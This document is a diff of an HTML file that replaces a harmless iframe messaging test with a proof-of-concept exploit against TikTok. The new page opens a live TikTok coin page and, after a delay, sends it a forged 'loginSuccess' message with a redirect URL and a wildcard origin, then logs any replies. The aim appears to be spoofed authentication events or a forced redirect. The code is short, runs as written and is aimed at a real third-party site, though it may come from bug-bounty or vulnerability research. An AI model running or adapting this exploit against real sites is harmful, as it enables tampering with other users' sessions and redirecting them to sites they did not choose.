@@ -1,27 +1,49 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-<body>
-    <iframe id="crossOriginIframe" src="https://calendar.google.com" frameborder="0"></iframe>
-</body>
+  <title>PoC TikTok postMessage via opener</title>
+  <script>
+    let output;
 
-<script>
-    window.onload = function() {
-      const iframe = document.getElementById('crossOriginIframe');
-      iframe.contentWindow.postMessage('Hello from parent!', 'https://calendar.google.com');
-  
-      window.addEventListener('message', (event) => {
-        if (event.origin === 'https://calendar.google.com') {
-          console.log('Mensagem recebida do iframe:', event.data);
-        } else {
-          console.log('Mensagem de origem não autorizada:', event.origin);
+    function log(msg) {
+      const el = document.createElement("div");
+      el.textContent = msg;
+      output.appendChild(el);
+    }
+
+    function testPostMessageOpener() {
+      const win = window.open("https://www.tiktok.com/coin/rLJKRPE?enter_from=web_live_nav");
+
+      // Aguarda a aba abrir e carrega
+      setTimeout(() => {
+        const payload = {
+          event: "loginSuccess",
+          redirectUrl: "https://x.com"
+        };
+
+        try {
+          win.postMessage(payload, "*");
+          log("Payload enviado via postMessage.");
+        } catch (e) {
+          log("Erro ao enviar postMessage: " + e.message);
         }
-      });
+      }, 7000);
+    }
+
+    // Listener para capturar mensagens de volta (se houver)
+    window.addEventListener("message", (e) => {
+      log("Mensagem recebida do destino:");
+      log(JSON.stringify(e.data));
+    });
+
+    window.onload = () => {
+      output = document.getElementById("log");
     };
   </script>
-  
+</head>
+<body>
+  <h1>PoC TikTok postMessage via opener</h1>
+  <button onclick="testPostMessageOpener()">Testar envio de loginSuccess</button>
+  <div id="log" style="margin-top: 20px; padding: 10px; background: #eee; font-family: monospace;"></div>
+</body>
 </html>
